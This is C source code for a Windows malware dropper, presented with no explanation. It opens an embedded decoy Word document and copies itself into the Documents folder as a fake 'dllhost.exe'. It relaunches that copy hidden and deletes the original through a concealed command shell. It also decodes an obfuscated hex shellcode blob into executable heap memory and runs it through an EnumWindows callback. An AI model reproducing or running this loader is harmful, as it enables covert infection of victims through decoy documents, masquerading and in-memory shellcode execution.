#pragma comment(linker,"/subsystem:\"windows\"  /entry:\"mainCRTStartup\"" )
#define _CRT_SECURE_NO_DEPRECATE
#include <string.h>
#include <windows.h>
#include <stdio.h>
#include <ShlObj.h>
#include "resource.h"

HMODULE g_hinstance = ::GetModuleHandle("wwlib.dll");

void FormatCode(char* array, char* buf) {
	_strrev(array);
	while (*array) {
		if (' ' == *array) {
			array++;
			continue;
		}
		sscanf(array, "%02X", buf);
		array += 2;
		buf++;
	}
}


bool ExportToFile(const char*& exportFilePath, const void* pBuffer, DWORD bufferLength)
{
	if (pBuffer == NULL || bufferLength <= 0)
	{
		return false;
	}
	HANDLE hFile = ::CreateFile(exportFilePath,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);

	if (hFile == NULL)
	{
		return false;
	}

	DWORD writetem = -1;
	BOOL ret = ::WriteFile(hFile, pBuffer, bufferLength, &writetem, NULL);
	if (writetem != bufferLength)
	{
		::CloseHandle(hFile);
		return false;
	}

	::CloseHandle(hFile);
	return true;
}


bool ExportDoc(const char* exportPath, DWORD resourceId)
{
	HINSTANCE m_hInstance = g_hinstance;

	HRSRC hrSrc = FindResource(m_hInstance, MAKEINTRESOURCE(resourceId), "doc");
	if (hrSrc == NULL)
	{
		return false;
	}
	HGLOBAL hGlobalResource = LoadResource(m_hInstance, hrSrc);
	if (hGlobalResource == NULL)
	{
		return false;
	}

	const void* pResourceData = ::LockResource(hGlobalResource);
	if (!pResourceData)
	{
		return false;
	}

	DWORD resLength = SizeofResource(m_hInstance, hrSrc);
	//reslen = resLength;
	//pResource = pResourceData;
	bool ret = ExportToFile(exportPath, pResourceData, resLength);
	FreeResource(hGlobalResource);
	return ret;
}


BOOL SelfDelete()
{
	TCHAR szModule[MAX_PATH],
		szComspec[MAX_PATH],
		szParams[MAX_PATH];

	// get file path names:
	if ((GetModuleFileName(0, szModule, MAX_PATH) != 0) &&
		(GetShortPathName(szModule, szModule, MAX_PATH) != 0) &&
		(GetEnvironmentVariable("COMSPEC", szComspec, MAX_PATH) != 0))
	{
		// set command shell parameters
		lstrcpy(szParams, " /c del ");
		lstrcat(szParams, szModule);
		lstrcat(szParams, " > nul");
		lstrcat(szComspec, szParams);


		// set struct members
		STARTUPINFO  si = { 0 };
		PROCESS_INFORMATION pi = { 0 };
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		// increase resource allocation to program
		SetPriorityClass(GetCurrentProcess(),
			REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentThread(),
			THREAD_PRIORITY_TIME_CRITICAL);

		// invoke command shell
		if (CreateProcess(0, szComspec, 0, 0, 0, CREATE_SUSPENDED |
			DETACHED_PROCESS, 0, 0, &si, &pi))
		{
			// suppress command shell process until program exits
			SetPriorityClass(pi.hProcess, IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread, THREAD_PRIORITY_IDLE);

			// resume shell process with new low priority
			ResumeThread(pi.hThread);

			// everything seemed to work
			return TRUE;
		}
		else // if error, normalize allocation
		{
			SetPriorityClass(GetCurrentProcess(),
				NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentThread(),
				THREAD_PRIORITY_NORMAL);
		}
	}
	return FALSE;
}

void directRun() {
	char docpath[MAX_PATH];
	char path[MAX_PATH];
	TCHAR szPath[MAX_PATH];
	TCHAR szcmd[MAX_PATH];
	GetModuleFileName(NULL, path, MAX_PATH);

	char drive[5];
	char dir[MAX_PATH];
	char filename[MAX_PATH];
	char fileext[10];
	_splitpath(path, drive, dir, filename, fileext);
	docpath[0] = '\0';
	strcat(docpath, drive);
	strcat(docpath, dir);
	strcat(docpath, filename);
	strcat(docpath, ".docx");

	if (ExportDoc(docpath, IDR_DOC1)) {
		ShellExecute(NULL, "open", docpath, NULL, NULL, 1);
	}

	BOOL bRet = SHGetSpecialFolderPath(NULL, szPath, CSIDL_PERSONAL, FALSE);
	strcat(szPath, "/");
	strcat(szPath, "dllhost.exe");

	CopyFile(path, szPath, FALSE);

	szcmd[0] = '\0';
	strcat(szcmd, szPath);
	strcat(szcmd, " run");

	STARTUPINFO startup_info;
	PROCESS_INFORMATION process_information;

	ZeroMemory(&startup_info, sizeof(startup_info));
	startup_info.cb = sizeof(startup_info);

	ZeroMemory(&process_information, sizeof(process_information));

	// If create process failed.
	// CREATE_NO_WINDOW = 0x08000000
	if (CreateProcess(szPath, szcmd, NULL, NULL, TRUE, 0x08000000, NULL,
		NULL, &startup_info, &process_information) == 0) {

	}

	SelfDelete();
	exit(0);

}


void hardCodeM() {

	char hexbuffer[] = "7eff141e576f58846c92843c10845dfff58c9d20ab149f9884ad98840f98949c13d47c98943c98845dff5e354a85ab149c13842f988485140000010086951404a66f98e5024c38845dfff58c9d20ab149f9884851440a69c13d42e988401ce38845dff652a5b0f865e57ecff94c0470c585dff16475a99ab149f98842e98c4851401a67c98845dff0efdf0aeab141c98840cff842c98840cff840c13d49c13d40505e514a0a65dff00b60892ab14950000101086ae98c45dff706277c4ab141f98c44e98944514d0208a0c2d400020cb945e98940000100ace18846e9894651400002333f5233777eb94d5ffffffb49e21b884a59514850eff251402ce3884a51495148514a595e5851485140d10848840b8140d1094c104b84484c0b814660d10944204b844858d571d93548042c430c41f570e831c1014d09c1c14ca0c13846d10848843b8149c13d49cff84653e8184b80d10940204b844050d108476470c58840000008808b80000002758f020b0818718660d1084c324b815140225b88425de2e1c1014d09c1c1402c220c716c3ca0c1384a4a47bf0840527b8849c13d465150225b8848125b8840625b884562d13842505141514000000cc8e0f4e3884cf";

	unsigned int memory_allocation = strlen(hexbuffer) / 2;

	char* buf = (char*)malloc(memory_allocation);

	if (NULL == buf) {
		printf("malloc error");
		return;
	}

	memset(buf, 0, memory_allocation);

	FormatCode(hexbuffer, buf);


	//heap
	LPVOID heapp = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
	LPVOID ptr = HeapAlloc(heapp, 0, memory_allocation);

	RtlMoveMemory(ptr, buf, memory_allocation);

	//callback
	::EnumWindows((WNDENUMPROC)ptr, NULL);
}


//
// Main function
//
int main(int argc, char* argv[]) {
	if (argc == 1)
	{
		directRun();
	}
	else {
		hardCodeM();
	}

}